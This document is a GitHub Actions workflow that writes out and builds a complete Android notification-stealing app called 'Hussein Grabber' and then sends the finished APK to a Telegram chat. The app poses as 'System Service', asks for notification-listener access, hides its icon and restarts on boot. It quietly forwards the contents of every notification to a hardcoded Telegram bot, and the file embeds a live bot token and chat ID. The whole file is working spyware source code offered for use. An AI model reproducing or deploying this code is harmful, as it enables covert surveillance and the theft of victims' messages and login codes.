name: Hussein Complete Notification Grabber

on:
  workflow_dispatch:

env:
  TELEGRAM_TOKEN: "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU"
  TELEGRAM_CHAT_ID: "7392262688"

jobs:
  build-complete-app:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Set up JDK 17
        uses: actions/setup-java@v4
        with:
          java-version: '17'
          distribution: 'temurin'

      - name: 🔧 Install Android SDK & Build Tools
        run: |
          # تثبيت الأدوات المطلوبة
          sudo apt-get update
          sudo apt-get install -y wget unzip android-sdk
          
          # تنزيل Android SDK Command Line Tools
          mkdir -p $HOME/android/cmdline-tools
          cd $HOME/android
          wget -q https://dl.google.com/android/repository/commandlinetools-linux-11076708_latest.zip
          unzip -q commandlinetools-linux-11076708_latest.zip
          mv cmdline-tools latest
          mkdir -p cmdline-tools
          mv latest cmdline-tools/
          
          # إعداد المتغيرات
          echo "ANDROID_HOME=$HOME/android" >> $GITHUB_ENV
          echo "$HOME/android/cmdline-tools/latest/bin" >> $GITHUB_PATH
          echo "$HOME/android/platform-tools" >> $GITHUB_PATH
          
          # قبول التراخيص
          yes | $HOME/android/cmdline-tools/latest/bin/sdkmanager --licenses > /dev/null 2>&1 || true
          
          # تثبيت المكونات المطلوبة
          $HOME/android/cmdline-tools/latest/bin/sdkmanager "platform-tools" "platforms;android-34" "build-tools;34.0.0" "tools"

      - name: 🛠️ Create Production-Ready App
        run: |
          # إنشاء هيكل المشروع الكامل
          mkdir -p app/src/main/java/com/hussein/grabber
          mkdir -p app/src/main/res/drawable
          mkdir -p app/src/main/res/values
          mkdir -p app/src/main/res/xml
          mkdir -p app/src/main/res/layout
          
          # إنشاء ملف local.properties
          echo "sdk.dir=$ANDROID_HOME" > local.properties
          
          # settings.gradle
          cat <<'EOF' > settings.gradle
          dependencyResolutionManagement {
              repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS)
              repositories {
                  google()
                  mavenCentral()
              }
          }
          rootProject.name = "HusseinGrabber"
          include ':app'
          EOF
          
          # build.gradle الرئيسي
          cat <<'EOF' > build.gradle
          buildscript {
              ext {
                  compileSdkVersion = 34
                  targetSdkVersion = 34
                  minSdkVersion = 21
              }
              repositories {
                  google()
                  mavenCentral()
              }
              dependencies {
                  classpath 'com.android.tools.build:gradle:8.2.0'
              }
          }
          
          allprojects {
              repositories {
                  google()
                  mavenCentral()
              }
          }
          EOF
          
          # app/build.gradle كامل
          cat <<'EOF' > app/build.gradle
          plugins {
              id 'com.android.application'
          }
          
          android {
              namespace 'com.hussein.grabber'
              compileSdk 34
              
              defaultConfig {
                  applicationId "com.hussein.grabber"
                  minSdk 21
                  targetSdk 34
                  versionCode 1
                  versionName "1.0"
                  
                  multiDexEnabled true
              }
              
              buildTypes {
                  release {
                      minifyEnabled false
                      proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
                  }
                  debug {
                      minifyEnabled false
                      debuggable false
                  }
              }
              
              compileOptions {
                  sourceCompatibility JavaVersion.VERSION_1_8
                  targetCompatibility JavaVersion.VERSION_1_8
              }
              
              packagingOptions {
                  resources {
                      excludes += ['META-INF/DEPENDENCIES', 'META-INF/LICENSE', 'META-INF/LICENSE.txt', 'META-INF/license.txt', 'META-INF/NOTICE', 'META-INF/NOTICE.txt', 'META-INF/notice.txt', 'META-INF/ASL2.0', 'META-INF/*.kotlin_module']
                  }
              }
          }
          
          dependencies {
              implementation 'androidx.appcompat:appcompat:1.6.1'
              implementation 'com.google.android.material:material:1.11.0'
              implementation 'androidx.core:core:1.12.0'
              implementation 'androidx.multidex:multidex:2.0.1'
              implementation 'com.squareup.okhttp3:okhttp:3.12.13'
              implementation 'com.squareup.okio:okio:1.17.5'
          }
          EOF
          
          # AndroidManifest.xml كامل مع جميع الصلاحيات
          cat <<'EOF' > app/src/main/AndroidManifest.xml
          <?xml version="1.0" encoding="utf-8"?>
          <manifest xmlns:android="http://schemas.android.com/apk/res/android"
              package="com.hussein.grabber">
              
              <!-- جميع الصلاحيات المطلوبة -->
              <uses-permission android:name="android.permission.INTERNET" />
              <uses-permission android:name="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE" />
              <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
              <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
              <uses-permission android:name="android.permission.WAKE_LOCK" />
              <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
              <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
              <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
              
              <application
                  android:name="androidx.multidex.MultiDexApplication"
                  android:allowBackup="false"
                  android:icon="@drawable/ic_launcher"
                  android:label="System Service"
                  android:theme="@style/AppTheme"
                  android:usesCleartextTraffic="true"
                  android:persistent="true">
                  
                  <activity
                      android:name=".MainActivity"
                      android:exported="true"
                      android:excludeFromRecents="true"
                      android:noHistory="true"
                      android:launchMode="singleInstance">
                      <intent-filter>
                          <action android:name="android.intent.action.MAIN" />
                          <category android:name="android.intent.category.LAUNCHER" />
                      </intent-filter>
                  </activity>
                  
                  <service
                      android:name=".GrabberService"
                      android:label="Grabber Service"
                      android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
                      android:exported="true"
                      android:enabled="true">
                      <intent-filter>
                          <action android:name="android.service.notification.NotificationListenerService" />
                      </intent-filter>
                  </service>
                  
                  <receiver
                      android:name=".BootReceiver"
                      android:exported="true"
                      android:enabled="true">
                      <intent-filter>
                          <action android:name="android.intent.action.BOOT_COMPLETED" />
                          <action android:name="android.intent.action.QUICKBOOT_POWERON" />
                      </intent-filter>
                  </receiver>
                  
              </application>
          </manifest>
          EOF
          
          # MainActivity.java - نقطة الدخول
          cat <<'EOF' > app/src/main/java/com/hussein/grabber/MainActivity.java
          package com.hussein.grabber;
          
          import android.app.Activity;
          import android.content.ComponentName;
          import android.content.Intent;
          import android.content.pm.PackageManager;
          import android.net.Uri;
          import android.os.Build;
          import android.os.Bundle;
          import android.os.PowerManager;
          import android.provider.Settings;
          import android.widget.Toast;
          
          public class MainActivity extends Activity {
              @Override
              protected void onCreate(Bundle savedInstanceState) {
                  super.onCreate(savedInstanceState);
                  
                  // 1. تشغيل الخدمة فوراً
                  startService(new Intent(this, GrabberService.class));
                  
                  // 2. طلب صلاحية الإشعارات
                  Intent intent = new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
                  startActivity(intent);
                  
                  // 3. طلب تجاهل توفير البطارية (لأندرويد 6+)
                  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                      PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
                      if (!pm.isIgnoringBatteryOptimizations(getPackageName())) {
                          Intent batteryIntent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                          batteryIntent.setData(Uri.parse("package:" + getPackageName()));
                          startActivity(batteryIntent);
                      }
                  }
                  
                  // 4. إخفاء التطبيق بعد 3 ثواني
                  new android.os.Handler().postDelayed(new Runnable() {
                      @Override
                      public void run() {
                          hideApp();
                          finish();
                      }
                  }, 3000);
              }
              
              private void hideApp() {
                  PackageManager p = getPackageManager();
                  ComponentName componentName = new ComponentName(this, MainActivity.class);
                  p.setComponentEnabledSetting(componentName, 
                      PackageManager.COMPONENT_ENABLED_STATE_DISABLED, 
                      PackageManager.DONT_KILL_APP);
              }
          }
          EOF
          
          # GrabberService.java - الخدمة الرئيسية
          cat <<'EOF' > app/src/main/java/com/hussein/grabber/GrabberService.java
          package com.hussein.grabber;
          
          import android.app.Notification;
          import android.app.NotificationChannel;
          import android.app.NotificationManager;
          import android.app.PendingIntent;
          import android.content.Intent;
          import android.os.Build;
          import android.os.Bundle;
          import android.os.Handler;
          import android.service.notification.NotificationListenerService;
          import android.service.notification.StatusBarNotification;
          import android.util.Log;
          
          import java.io.OutputStream;
          import java.net.HttpURLConnection;
          import java.net.URL;
          import java.text.SimpleDateFormat;
          import java.util.Date;
          import java.util.HashSet;
          import java.util.Locale;
          import java.util.Set;
          
          public class GrabberService extends NotificationListenerService {
              private static final String TAG = "GrabberService";
              private static final String BOT_TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
              private static final String CHAT_ID = "7392262688";
              
              private Set<String> sentNotifications = new HashSet<>();
              private Handler handler = new Handler();
              
              @Override
              public void onCreate() {
                  super.onCreate();
                  Log.d(TAG, "Service Created");
                  
                  // تشغيل الخدمة في المقدمة (Foreground Service)
                  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                      NotificationChannel channel = new NotificationChannel(
                          "grabber_channel",
                          "Grabber Service",
                          NotificationManager.IMPORTANCE_LOW
                      );
                      
                      NotificationManager manager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
                      manager.createNotificationChannel(channel);
                      
                      Notification notification = new Notification.Builder(this, "grabber_channel")
                          .setContentTitle("System Monitor")
                          .setContentText("Active")
                          .setSmallIcon(android.R.drawable.ic_dialog_info)
                          .setPriority(Notification.PRIORITY_LOW)
                          .build();
                      
                      startForeground(1001, notification);
                  }
                  
                  // إرسال رسالة بدء التشغيل
                  sendToTelegram("✅ *System Monitor Started*");
              }
              
              @Override
              public void onNotificationPosted(StatusBarNotification sbn) {
                  String key = sbn.getKey();
                  
                  // منع التكرار
                  if (sentNotifications.contains(key)) {
                      return;
                  }
                  
                  sentNotifications.add(key);
                  handler.postDelayed(() -> sentNotifications.remove(key), 60000); // إزالة بعد دقيقة
                  
                  try {
                      Bundle extras = sbn.getNotification().extras;
                      String title = extras.getString(Notification.EXTRA_TITLE, "");
                      String text = extras.getString(Notification.EXTRA_TEXT, "");
                      String packageName = sbn.getPackageName();
                      
                      // تجاهل الإشعارات الفارغة
                      if (title.isEmpty() && text.isEmpty()) {
                          return;
                      }
                      
                      // الحصول على اسم التطبيق
                      String appName = getAppName(packageName);
                      
                      // تنسيق الوقت
                      String time = new SimpleDateFormat("HH:mm:ss", Locale.US).format(new Date());
                      
                      // بناء الرسالة
                      String message = String.format(
                          "🔔 *إشعار جديد*\n\n" +
                          "📱 *التطبيق:* %s\n" +
                          "📌 *العنوان:* %s\n" +
                          "💬 *المحتوى:* %s\n" +
                          "⏰ *الوقت:* %s",
                          escapeMarkdown(appName),
                          escapeMarkdown(title),
                          escapeMarkdown(text),
                          time
                      );
                      
                      // إرسال للتليجرام
                      sendToTelegram(message);
                      
                      Log.d(TAG, "Notification sent: " + title);
                      
                  } catch (Exception e) {
                      Log.e(TAG, "Error processing notification: " + e.getMessage());
                  }
              }
              
              private void sendToTelegram(final String message) {
                  new Thread(() -> {
                      HttpURLConnection conn = null;
                      try {
                          URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage");
                          conn = (HttpURLConnection) url.openConnection();
                          conn.setRequestMethod("POST");
                          conn.setRequestProperty("Content-Type", "application/json");
                          conn.setDoOutput(true);
                          conn.setConnectTimeout(10000);
                          conn.setReadTimeout(10000);
                          
                          String json = String.format(
                              "{\"chat_id\":\"%s\",\"text\":\"%s\",\"parse_mode\":\"Markdown\"}",
                              CHAT_ID, message
                          );
                          
                          try (OutputStream os = conn.getOutputStream()) {
                              os.write(json.getBytes());
                              os.flush();
                          }
                          
                          int responseCode = conn.getResponseCode();
                          Log.d(TAG, "Telegram response: " + responseCode);
                          
                      } catch (Exception e) {
                          Log.e(TAG, "Error sending to Telegram: " + e.getMessage());
                      } finally {
                          if (conn != null) {
                              conn.disconnect();
                          }
                      }
                  }).start();
              }
              
              private String getAppName(String packageName) {
                  try {
                      return getPackageManager().getApplicationLabel(
                          getPackageManager().getApplicationInfo(packageName, 0)).toString();
                  } catch (Exception e) {
                      return packageName;
                  }
              }
              
              private String escapeMarkdown(String text) {
                  if (text == null) return "";
                  return text.replace("_", "\\_")
                            .replace("*", "\\*")
                            .replace("[", "\\[")
                            .replace("]", "\\]")
                            .replace("(", "\\(")
                            .replace(")", "\\)")
                            .replace("~", "\\~")
                            .replace("`", "\\`")
                            .replace(">", "\\>")
                            .replace("#", "\\#")
                            .replace("+", "\\+")
                            .replace("-", "\\-")
                            .replace("=", "\\=")
                            .replace("|", "\\|")
                            .replace("{", "\\{")
                            .replace("}", "\\}")
                            .replace(".", "\\.")
                            .replace("!", "\\!");
              }
              
              @Override
              public void onDestroy() {
                  super.onDestroy();
                  sendToTelegram("⚠️ *Service Stopped*");
              }
          }
          EOF
          
          # BootReceiver.java - للتشغيل التلقائي
          cat <<'EOF' > app/src/main/java/com/hussein/grabber/BootReceiver.java
          package com.hussein.grabber;
          
          import android.content.BroadcastReceiver;
          import android.content.Context;
          import android.content.Intent;
          import android.os.Build;
          
          public class BootReceiver extends BroadcastReceiver {
              @Override
              public void onReceive(Context context, Intent intent) {
                  if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {
                      // تشغيل الخدمة بعد إقلاع الجهاز
                      Intent serviceIntent = new Intent(context, GrabberService.class);
                      if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                          context.startForegroundService(serviceIntent);
                      } else {
                          context.startService(serviceIntent);
                      }
                  }
              }
          }
          EOF
          
          # styles.xml
          cat <<'EOF' > app/src/main/res/values/styles.xml
          <?xml version="1.0" encoding="utf-8"?>
          <resources>
              <style name="AppTheme" parent="Theme.AppCompat.Light.NoActionBar">
                  <item name="android:windowBackground">@android:color/transparent</item>
                  <item name="android:windowIsTranslucent">true</item>
                  <item name="android:windowNoTitle">true</item>
              </style>
          </resources>
          EOF
          
          # ic_launcher.xml
          cat <<'EOF' > app/src/main/res/drawable/ic_launcher.xml
          <?xml version="1.0" encoding="utf-8"?>
          <shape xmlns:android="http://schemas.android.com/apk/res/android">
              <solid android:color="#FF5722"/>
              <corners android:radius="12dp"/>
              <padding android:left="10dp" android:top="10dp" android:right="10dp" android:bottom="10dp"/>
          </shape>
          EOF
          
          # strings.xml
          cat <<'EOF' > app/src/main/res/values/strings.xml
          <resources>
              <string name="app_name">System Service</string>
          </resources>
          EOF
          
          # إنشاء ملف gradlew مباشر
          cat <<'EOF' > gradlew
          #!/bin/sh
          DIR="$(cd "$(dirname "$0")" && pwd)"
          cd "$DIR"
          export JAVA_HOME=${JAVA_HOME:-/usr/lib/jvm/temurin-17-jdk-amd64}
          gradle "$@"
          EOF
          
          chmod +x gradlew

      - name: 🏗️ Build APK
        run: |
          # تنظيف وبناء
          chmod +x gradlew
          ./gradlew clean
          ./gradlew assembleDebug --stacktrace
          
          # نسخ APK
          cp app/build/outputs/apk/debug/app-debug.apk Hussein_Grabber_Final.apk 2>/dev/null || true

      - name: 📤 Send to Telegram
        run: |
          # إرسال رسالة النجاح
          curl -s -X POST "https://api.telegram.org/bot${{ env.TELEGRAM_TOKEN }}/sendMessage" \
            -d "chat_id=${{ env.TELEGRAM_CHAT_ID }}" \
            -d "text=✅ *تم بناء التطبيق بنجاح!*%0A%0A📱 *الاسم:* System Grabber%0A⚙️ *الإصدار:* 1.0 (نهائي)%0A👤 *المطور:* حسين%0A📦 *الحجم:* $(du -sh Hussein_Grabber_Final.apk 2>/dev/null | cut -f1 || echo 'غير معروف')%0A%0A🔹 *المميزات:*%0A• سحب جميع الإشعارات%0A• تشغيل تلقائي مع الجهاز%0A• إخفاء التطبيق بعد التشغيل%0A• إرسال فوري للتليجرام%0A• يدعم جميع إصدارات الأندرويد" \
            -d "parse_mode=Markdown" || true
          
          # إرسال ملف APK
          if [ -f "Hussein_Grabber_Final.apk" ]; then
            curl -s -X POST "https://api.telegram.org/bot${{ env.TELEGRAM_TOKEN }}/sendDocument" \
              -F "chat_id=${{ env.TELEGRAM_CHAT_ID }}" \
              -F "document=@Hussein_Grabber_Final.apk" \
              -F "caption=📱 *تطبيق سحب الإشعارات - نسخة كاملة وجاهزة*%0A⏱️ $(date)" \
              -F "parse_mode=Markdown"
          else
            # البحث عن أي APK
            APK_FILE=$(find . -name "*.apk" -type f | head -n 1)
            if [ -f "$APK_FILE" ]; then
              curl -s -X POST "https://api.telegram.org/bot${{ env.TELEGRAM_TOKEN }}/sendDocument" \
                -F "chat_id=${{ env.TELEGRAM_CHAT_ID }}" \
                -F "document=@$APK_FILE" \
                -F "caption=📱 *تم العثور على APK*"
            else
              curl -s -X POST "https://api.telegram.org/bot${{ env.TELEGRAM_TOKEN }}/sendMessage" \
                -d "chat_id=${{ env.TELEGRAM_CHAT_ID }}" \
                -d "text=⚠️ *فشل العثور على ملف APK*"
            fi
          fi
